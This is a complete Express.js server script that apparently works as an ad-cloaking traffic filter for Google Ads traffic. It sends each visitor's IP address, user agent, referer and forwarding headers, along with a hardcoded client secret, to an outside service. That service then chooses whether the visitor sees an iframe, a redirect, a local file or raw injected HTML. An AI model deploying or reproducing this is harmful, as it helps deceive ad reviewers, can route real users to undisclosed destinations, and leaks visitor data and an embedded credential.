const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

const SERVER_URL = 'https://rbl.palladium.expert';

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Function to collect headers
function collectHeaders(req) {
  return {
    remoteAddr: req.ip,
    userAgent: req.get('User-Agent'),
    referer: req.get('Referer'),
    xForwardedFor: req.get('X-Forwarded-For'),
    requestURI: req.originalUrl,
    requestMethod: req.method,
  };
}

// Main route to handle incoming requests
app.get('/', async (req, res) => {
  try {
    const headers = {
      request: req.body || {},
      jsrequest: {}, // You can include additional JS request data if needed
      server: collectHeaders(req),
      auth: {
        clientId: 3575,
        clientCompany: 'dcJWAeznRSUsTOKDlgsg',
        clientSecret: 'MzU3NWRjSldBZXpuUlNVc1RPS0RsZ3NnY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
      },
      bannerSource: 'adwords',
    };

    const response = await axios.post(SERVER_URL, headers);

    const reply = response.data;

    if (reply.result) {
      switch (reply.mode) {
        case 1: // Display iFrame
          res.send(`
            <html>
              <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
              </head>
              <body>
                <iframe src="${reply.target}" style="width:100%; height:100%; border:none;"></iframe>
              </body>
            </html>
          `);
          break;

        case 2: // Redirect
          res.redirect(reply.target);
          break;

        case 3: // Serve local content
          res.sendFile(reply.target, { root: __dirname });
          break;

        case 4: // Display content
          res.send(reply.content);
          break;

        default:
          res.status(404).send('Not Found');
          break;
      }
    } else {
      res.status(500).send('<h1>500 Internal Server Error</h1><p>Server responded with an error.</p>');
    }
  } catch (error) {
    console.error(error.message);
    res.status(500).send('<h1>500 Internal Server Error</h1><p>Request failed.</p>');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
